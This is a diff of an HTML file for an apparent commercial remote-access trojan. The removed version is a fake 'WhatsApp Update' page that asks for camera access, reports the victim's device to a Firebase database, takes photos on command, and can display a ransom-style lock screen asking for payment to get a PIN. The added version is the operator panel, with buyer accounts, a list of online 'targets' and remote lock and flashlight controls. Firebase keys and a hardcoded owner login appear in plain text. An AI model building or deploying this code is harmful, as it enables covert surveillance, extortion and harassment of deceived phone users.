@@ -1,117 +1,144 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Update</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <title>V-PROJECT | RAT SYSTEM</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #111b21; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .wa-box { background: #202c33; padding: 25px; border-radius: 12px; width: 85%; text-align: center; border-top: 5px solid #00a884; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .wa-btn { background: #00a884; color: #fff; border: none; padding: 15px; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
-        video, canvas { display: none; }
-        #lock-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #f00; z-index: 9999; text-align: center; padding: 40px 20px; font-family: monospace; }
-        .pin-box { background: #111; border: 2px solid #f00; color: #f00; padding: 12px; width: 80%; text-align: center; font-size: 20px; margin-top: 20px; outline: none; }
-        .btn-unlock { background: #f00; color: #000; border: none; padding: 15px 30px; font-weight: bold; margin-top: 20px; cursor: pointer; border-radius: 5px; }
+        body { background: #050505; color: #00ffcc; font-family: monospace; padding: 20px; }
+        .box { border: 2px solid #00ffcc; padding: 20px; border-radius: 15px; max-width: 500px; margin: auto; background: #000; box-shadow: 0 0 20px #00ffcc44; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #00ffcc; color: #fff; border-radius: 8px; text-align: center; }
+        .btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .btn-buyer { background: #00ffcc; color: #000; }
+        .btn-red { background: #ff3366; color: #fff; }
+        .target-item { background: #111; border: 1px solid #00ffcc; padding: 15px; margin: 10px 0; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        .target-item:hover { background: #00ffcc; color: #000; }
+        #control-section { display: none; margin-top: 20px; border-top: 2px dashed #333; padding-top: 20px; }
+        #login-box, #owner-panel, #buyer-panel { display: none; }
+        .id-badge { color: yellow; font-size: 18px; font-weight: bold; margin-bottom: 15px; }
     </style>
 </head>
 <body>
-    <div id="setup-box" class="wa-box">
-        <h3 style="color: #00a884;">ELVOXI | SECURITY</h3>
-        <p style="font-size: 14px; color: #8696a0;">Pembaruan sistem diperlukan untuk stabilisasi perangkat.</p>
-        <button class="wa-btn" onclick="startASX()">UPDATE SEKARANG</button>
+
+<div id="login-box" class="box" style="display: block;">
+    <h2>V-PROJECT LOGIN</h2>
+    <input type="text" id="user" placeholder="Username">
+    <input type="password" id="pass" placeholder="Password">
+    <button class="btn btn-buyer" onclick="handleLogin()">LOGIN</button>
+</div>
+
+<div id="owner-panel" class="box">
+    <h3>OWNER PANEL</h3>
+    <input type="text" id="new_u" placeholder="Buyer Username">
+    <input type="text" id="new_p" placeholder="Buyer Password">
+    <button class="btn btn-buyer" style="background:#bb00ff; color:#fff" onclick="createAccount()">CREATE BUYER</button>
+    <hr color="#222">
+    <div id="list-account"></div>
+</div>
+
+<div id="buyer-panel" class="box">
+    <div class="id-badge">ID ANDA: <span id="display_my_id"></span></div>
+    <p style="font-size: 10px;">LIST TARGET ONLINE:</p>
+    
+    <div id="target-list">
+        <p style="color:#555">Menunggu target...</p>
     </div>
 
-    <div id="lock-screen">
-        <h1 id="lock-title">DEVICE ENCRYPTED</h1>
-        <p id="lock-msg">Your files are locked. Pay to get PIN.</p>
-        <input type="number" id="pin-input" class="pin-box" placeholder="ENTER PIN">
-        <br>
-        <button class="btn-unlock" onclick="checkPin()">UNLOCK DEVICE</button>
+    <div id="control-section">
+        <p>CONTROLING: <b id="target_name_display" style="color:yellow"></b></p>
+        <div style="display:flex; gap:5px;">
+            <button class="btn btn-buyer" onclick="send('senter', 'ON')">SENTER ON</button>
+            <button class="btn btn-red" onclick="send('senter', 'OFF')">OFF</button>
+        </div>
+        <div style="display:flex; gap:5px;">
+            <button class="btn btn-red" onclick="send('lock', 'ON')">LOCK</button>
+            <button class="btn btn-buyer" style="background:cyan" onclick="send('lock', 'OFF')">UNLOCK</button>
+        </div>
+        <button class="btn btn-red" onclick="closeControl()" style="margin-top:10px; font-size:10px;">TUTUP KONTROL</button>
     </div>
+</div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c" width="640" height="480"></canvas>
-    <audio id="player"></audio>
+<script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
+      authDomain: "rat-html.firebaseapp.com",
+      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "rat-html",
+      storageBucket: "rat-html.firebasestorage.app",
+      messagingSenderId: "1060124583265",
+      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
+      measurementId: "G-XMHT2S731L"
+    };
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyAujMVUdlPs4XGzTTq_o51kRil4OYZ5JoU",
-            authDomain: "elvoxi-ganteng.firebaseapp.com",
-            databaseURL: "https://elvoxi-ganteng-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "elvoxi-ganteng",
-            storageBucket: "elvoxi-ganteng.firebasestorage.app",
-            messagingSenderId: "88989958637",
-            appId: "1:88989958637:web:c1d21102ef24bbf6de27e4"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const tid = "ELV_" + Math.random().toString(36).substr(2, 5);
-        let currentStream; let vbtInt; let correctPin = "1234";
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let myActiveID = "";
+    let selectedTargetDevice = "";
 
-        async function getDeviceModel() {
-            if (navigator.userAgentData?.getHighEntropyValues) {
-                const info = await navigator.userAgentData.getHighEntropyValues(["model"]);
-                if (info.model) return info.model;
-            }
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^;]+);/);
-            let model = match ? match[1].replace("Linux; ", "").replace("Android ", "") : "Android Device";
-            if (model.includes("Linux")) {
-                if (/infinix/i.test(ua)) model = "Infinix Device";
-                else if (/samsung/i.test(ua)) model = "Samsung Galaxy";
-                else if (/vivo/i.test(ua)) model = "Vivo Device";
-            }
-            return model;
+    function handleLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        if(u === "elvoxi123" && p === "123") {
+            document.getElementById('login-box').style.display = 'none';
+            document.getElementById('owner-panel').style.display = 'block';
+            loadAccounts();
+        } else {
+            db.ref('accounts/' + u).once('value', (s) => {
+                if(s.exists() && s.val().pass === p) {
+                    myActiveID = s.val().targetID;
+                    document.getElementById('login-box').style.display = 'none';
+                    document.getElementById('buyer-panel').style.display = 'block';
+                    document.getElementById('display_my_id').innerText = myActiveID;
+                    listenTargets();
+                } else { alert("Data Salah!"); }
+            });
         }
+    }
 
-        async function startASX(mode = "environment") {
-            try {
-                if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                currentStream = s;
-                const video = document.getElementById('v');
-                video.srcObject = s;
-                const track = s.getVideoTracks()[0];
-                const nameHP = await getDeviceModel();
-                const ref = db.ref('targets/' + tid);
+    // Fungsi buat dengerin HP mana aja yang masuk ke ID Buyer ini
+    function listenTargets() {
+        db.ref('users/' + myActiveID).on('value', (snap) => {
+            let html = "";
+            snap.forEach((child) => {
+                const deviceName = child.val().device_info || "Unknown Device";
+                html += `<div class="target-item" onclick="openControl('${child.key}', '${deviceName}')">
+                            📱 ${deviceName} (${child.key})
+                         </div>`;
+            });
+            document.getElementById('target-list').innerHTML = html || "Belum ada target.";
+        });
+    }
 
-                ref.update({ model: nameHP, status: "Online", cam: mode });
-                ref.onDisconnect().remove();
+    function openControl(deviceId, name) {
+        selectedTargetDevice = deviceId;
+        document.getElementById('target_name_display').innerText = name;
+        document.getElementById('control-section').style.display = 'block';
+    }
 
-                db.ref('commands/' + tid).on('child_added', async (snap) => {
-                    const cmd = snap.val(); const key = snap.key; if(!cmd) return;
-                    
-                    if(cmd.type === "switch_cam") startASX(cmd.mode);
-                    if(cmd.type === "flash") track.applyConstraints({ advanced: [{ torch: (cmd.status === "on") }] });
-                    if(cmd.type === "play_music") { const p = document.getElementById('player'); p.src = cmd.url; p.play(); }
-                    if(cmd.type === "stop_music") { const p = document.getElementById('player'); p.pause(); p.currentTime = 0; }
-                    if(cmd.type === "vbt_on") { clearInterval(vbtInt); vbtInt = setInterval(() => navigator.vibrate(500), 1000); }
-                    if(cmd.type === "vbt_off") { clearInterval(vbtInt); navigator.vibrate(0); }
-                    if(cmd.type === "speak") { let m = new SpeechSynthesisUtterance(cmd.text); m.lang='id-ID'; window.speechSynthesis.speak(m); }
-                    if(cmd.type === "snap") {
-                        const canvas = document.getElementById('c');
-                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                        ref.update({ foto: canvas.toDataURL('image/jpeg', 0.5) });
-                    }
-                    if(cmd.type === "lock") {
-                        document.getElementById('lock-screen').style.display = 'block';
-                        document.getElementById('lock-title').innerText = cmd.title;
-                        document.getElementById('lock-msg').innerText = cmd.msg;
-                        correctPin = cmd.pin;
-                    }
-                    db.ref('commands/' + tid + '/' + key).remove();
-                });
-                document.getElementById('setup-box').innerHTML = "<h3>Security Enabled</h3>";
-            } catch (e) { alert("Wajib izinkan kamera!"); }
-        }
+    function closeControl() {
+        document.getElementById('control-section').style.display = 'none';
+    }
 
-        function checkPin() {
-            if(document.getElementById('pin-input').value === correctPin) {
-                document.getElementById('lock-screen').style.display = 'none';
-            } else { alert("SALAH PIN!"); }
-        }
-    </script>
+    function send(k, v) {
+        db.ref('users/' + myActiveID + '/' + selectedTargetDevice + '/' + k).set(v);
+    }
+
+    // Fungsi Owner
+    function createAccount() {
+        const u = document.getElementById('new_u').value;
+        const p = document.getElementById('new_p').value;
+        const tID = "EVX-" + Math.floor(Math.random() * 8999 + 1000);
+        db.ref('accounts/' + u).set({ pass: p, targetID: tID });
+    }
+
+    function loadAccounts() {
+        db.ref('accounts').on('value', (s) => {
+            let h = "";
+            s.forEach((c) => { h += `<div style='border:1px solid #333; margin:5px; padding:5px;'>U: ${c.key} | ID: ${c.val().targetID}</div>`; });
+            document.getElementById('list-account').innerHTML = h;
+        });
+    }
+</script>
 </body>
 </html>
